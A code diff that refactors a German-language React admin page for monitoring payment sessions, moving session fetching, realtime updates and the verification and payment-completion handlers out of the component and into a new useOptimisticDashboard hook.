@@ -7,8 +7,8 @@ import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
+import { useOptimisticDashboard } from '@/hooks/useOptimisticDashboard';
 import { useToast } from '@/hooks/use-toast';
-import { supabase } from '@/integrations/supabase/client';
 import { format } from 'date-fns';
 import { de } from 'date-fns/locale';
 
@@ -35,136 +35,25 @@ interface PaymentSession {
 }
 
 const Payments = () => {
-  const [activeSessions, setActiveSessions] = useState<PaymentSession[]>([]);
-  const [inactiveSessions, setInactiveSessions] = useState<PaymentSession[]>([]);
   const [showInactive, setShowInactive] = useState(false);
-  const [loading, setLoading] = useState(true);
   const { toast } = useToast();
-
-  const fetchSessions = async () => {
-    try {
-      setLoading(true);
-      
-      // Fetch active sessions
-      const activeResponse = await supabase.functions.invoke('payment-sessions/active-sessions');
-      if (activeResponse.data?.sessions) {
-        setActiveSessions(activeResponse.data.sessions);
-      }
-
-      // Fetch inactive sessions if needed
-      if (showInactive) {
-        const inactiveResponse = await supabase.functions.invoke('payment-sessions/inactive-sessions');
-        if (inactiveResponse.data?.sessions) {
-          setInactiveSessions(inactiveResponse.data.sessions);
-        }
-      }
-    } catch (error) {
-      console.error('Error fetching sessions:', error);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  // Initial load only
-  useEffect(() => {
-    fetchSessions();
-  }, []);
+  
+  // Use optimistic dashboard hook
+  const {
+    activeSessions,
+    inactiveSessions,
+    loading,
+    fetchInactiveSessions,
+    handleVerificationAction,
+    handleCompletePayment
+  } = useOptimisticDashboard();
 
   // Handle show/hide inactive sessions
   useEffect(() => {
     if (showInactive) {
-      // Fetch inactive sessions when switching to inactive view
-      const fetchInactiveSessions = async () => {
-        try {
-          const inactiveResponse = await supabase.functions.invoke('payment-sessions/inactive-sessions');
-          if (inactiveResponse.data?.sessions) {
-            setInactiveSessions(inactiveResponse.data.sessions);
-          }
-        } catch (error) {
-          console.error('Error fetching inactive sessions:', error);
-        }
-      };
       fetchInactiveSessions();
     }
-  }, [showInactive]);
-
-  // Realtime updates with granular session updates
-  useEffect(() => {
-    const handleRealtimeUpdate = async (payload: any) => {
-      const { eventType, new: newRecord, old: oldRecord } = payload;
-      
-      if (eventType === 'INSERT') {
-        // Fetch the complete session data with orders
-        const { data: sessionData } = await supabase.functions.invoke('payment-sessions/active-sessions');
-        if (sessionData?.sessions) {
-          const newSession = sessionData.sessions.find((s: PaymentSession) => s.session_id === newRecord.session_id);
-          if (newSession) {
-            setActiveSessions(prev => [...prev, newSession]);
-          }
-        }
-      } else if (eventType === 'UPDATE') {
-        // Check if session is still active (within 30 minutes)
-        const thirtyMinutesAgo = Date.now() - 30 * 60 * 1000;
-        const lastSeenTime = new Date(newRecord.last_seen).getTime();
-        const isSessionActive = newRecord.is_active && lastSeenTime > thirtyMinutesAgo;
-        
-        if (isSessionActive) {
-          // Update active sessions
-          setActiveSessions(prev => 
-            prev.map(session => 
-              session.session_id === newRecord.session_id 
-                ? { ...session, ...newRecord }
-                : session
-            )
-          );
-          // Remove from inactive if present
-          setInactiveSessions(prev => 
-            prev.filter(session => session.session_id !== newRecord.session_id)
-          );
-        } else {
-          // Move to inactive sessions
-          setActiveSessions(prev => {
-            const sessionToMove = prev.find(s => s.session_id === newRecord.session_id);
-            if (sessionToMove) {
-              const updatedSession = { ...sessionToMove, ...newRecord };
-              setInactiveSessions(inactivePrev => {
-                const exists = inactivePrev.some(s => s.session_id === newRecord.session_id);
-                if (!exists) {
-                  return [...inactivePrev, updatedSession];
-                }
-                return inactivePrev.map(session => 
-                  session.session_id === newRecord.session_id ? updatedSession : session
-                );
-              });
-            }
-            return prev.filter(session => session.session_id !== newRecord.session_id);
-          });
-        }
-      } else if (eventType === 'DELETE') {
-        // Remove from both lists
-        setActiveSessions(prev => prev.filter(session => session.session_id !== oldRecord.session_id));
-        setInactiveSessions(prev => prev.filter(session => session.session_id !== oldRecord.session_id));
-      }
-    };
-
-    // Listen to realtime updates
-    const channel = supabase
-      .channel('payment-sessions-changes')
-      .on(
-        'postgres_changes',
-        {
-          event: '*',
-          schema: 'public',
-          table: 'payment_sessions'
-        },
-        handleRealtimeUpdate
-      )
-      .subscribe();
-
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, []);
+  }, [showInactive, fetchInactiveSessions]);
 
   const formatLastSeen = (lastSeen: string) => {
     const now = new Date();
@@ -219,41 +108,7 @@ const Payments = () => {
     }
   };
 
-  const handleVerificationAction = async (sessionId: string, method: string) => {
-    try {
-      await supabase.functions.invoke('payment-sessions/set-verification-method', {
-        body: { sessionId, method }
-      });
-      toast({
-        title: "Aktion erfolgreich",
-        description: `Verifikationsmethode "${method}" wurde gesetzt.`,
-      });
-    } catch (error) {
-      toast({
-        title: "Fehler",
-        description: "Aktion konnte nicht ausgeführt werden.",
-        variant: "destructive"
-      });
-    }
-  };
-
-  const handleCompletePayment = async (sessionId: string) => {
-    try {
-      await supabase.functions.invoke('payment-sessions/complete-payment', {
-        body: { sessionId }
-      });
-      toast({
-        title: "Zahlung abgeschlossen",
-        description: "Der Nutzer wird zur Bestätigungsseite weitergeleitet.",
-      });
-    } catch (error) {
-      toast({
-        title: "Fehler",
-        description: "Zahlung konnte nicht abgeschlossen werden.",
-        variant: "destructive"
-      });
-    }
-  };
+  // Action handlers are now provided by the hook
 
   const getVerificationStatusBadge = (status: string) => {
     switch (status) {
